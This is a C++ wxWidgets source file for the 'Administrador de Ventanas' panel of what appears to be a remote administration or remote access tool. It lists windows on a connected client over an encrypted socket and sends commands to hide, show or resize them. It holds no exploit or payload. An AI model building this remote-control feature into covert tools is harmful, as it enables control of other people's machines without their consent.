#include "server.hpp"
#include "misc.hpp"
#include "panel_wmanager.hpp"


extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(ListWmManager, wxListCtrl)
	EVT_MENU(wxID_ANY, ListWmManager::OnWMmessage)
	EVT_CONTEXT_MENU(ListWmManager::OnContextMenu)
wxEND_EVENT_TABLE()

panelWManager::panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string _strID, ByteArray c_key)
	: wxFrame(pParent, EnumIDS::ID_Panel_WM, "Administrador de Ventanas") {
	this->sckCliente = sckCliente;
	this->enc_key = c_key;
	this->SetName(_strID + "-WM");
	this->SetTitle("[" + _strID + "] Administrador de Ventanas");
	this->m_CrearListView();

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void panelWManager::m_CrearListView() {
	this->listManager = new ListWmManager(this, EnumIDS::ID_Panel_WM_ListView, wxDefaultPosition, wxDefaultSize, wxLC_REPORT  | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES, this->enc_key);

	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
	sizer->Add(this->listManager, 1, wxEXPAND | wxALL, 2);

	this->SetSizer(sizer);

	this->listManager->sckCliente = this->sckCliente;

	wxListItem itemCol;
	itemCol.SetText("Ventana");
	itemCol.SetWidth(300);
	this->listManager->InsertColumn(0, itemCol);

}

void ListWmManager::AgregarData(const std::string& strBuffer) {
	std::string str = strBuffer;
	std::string delimiter = "<sap3>";
	size_t pos = 0;
	std::string token;
	int iCount = 0;
	while ((pos = str.find(delimiter)) != std::string::npos) {
		token = str.substr(0, pos); 
		this->InsertItem(iCount++, token);
		str.erase(0, pos + delimiter.length());
	}
	this->InsertItem(iCount, token);
}

void panelWManager::AgregarData(const std::string& strBuffer) {
	this->listManager->AgregarData(strBuffer);
}

void ListWmManager::OnWMmessage(wxCommandEvent& event) {
	int iMessage = event.GetId();
	if (iMessage == EnumComandos::WM_Lista) {
		this->DeleteAllItems();
		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, iMessage, this->enc_key);
	}else {
		long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
		std::string strParam = this->GetItemText(item, 0);
		strParam.append(1, CMD_DEL);
		strParam += std::to_string(iMessage);

		p_Servidor->cChunkSend(this->sckCliente, strParam.c_str(), strParam.size(), 0, true, EnumComandos::WM_CMD, this->enc_key);
	}
	event.Skip();
}

void ListWmManager::ShowContextMenu(const wxPoint& pos, bool isEmpty) {
	wxMenu menu;

	menu.Append(EnumComandos::WM_Lista, "Refrescar");
	if (!isEmpty) {
		menu.Append(SW_HIDE, "Ocultar");
		menu.Append(SW_NORMAL, "Activar");
		menu.Append(SW_SHOW, "Mostrar");
		menu.Append(SW_MINIMIZE, "Minimizar");
		menu.Append(SW_MAXIMIZE, "Maximizar");
		menu.Append(SW_RESTORE, "Restaurar");
	}

	PopupMenu(&menu, pos.x, pos.y);

}

void ListWmManager::OnContextMenu(wxContextMenuEvent& event) {
	if (GetEditControl() == NULL)
	{
		wxPoint point = event.GetPosition();

		// If from keyboard
		if ((point.x == -1) && (point.y == -1))
		{
			wxSize size = GetSize();
			point.x = size.x / 2;
			point.y = size.y / 2;
		}
		else
		{
			point = ScreenToClient(point);
		}

		int flags;
		long iItem = HitTest(point, flags);

		this->ShowContextMenu(point, iItem == -1 ? true : false);

	}
	else {
		event.Skip();
	}
}